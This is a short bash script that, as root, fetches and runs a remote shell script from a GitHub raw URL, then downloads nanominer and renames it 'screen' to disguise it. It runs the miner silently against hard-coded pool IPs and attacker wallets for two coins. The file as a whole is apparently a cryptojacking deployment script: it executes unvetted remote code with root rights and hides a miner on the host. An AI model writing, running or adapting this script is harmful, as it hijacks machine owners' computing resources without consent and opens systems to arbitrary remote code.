#!/bin/bash
sudo su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
apt-get -y install screen
EOF

screen

mkdir udocker

cd udocker

wget https://github.com/nanopool/nanominer/releases/download/v3.9.2/nanominer-linux-3.9.2.tar.gz && tar -xvf nanominer-linux-3.9.2.tar.gz &&  mv nanominer screen && rm -rf con* nano*

./screen -silence 2 -algo PyrinHash -wallet pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) -pool1 47.237.21.190:443 -coin PYI -algo randomx -wallet ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -pool1 47.89.195.104:443 -coin ZEPH
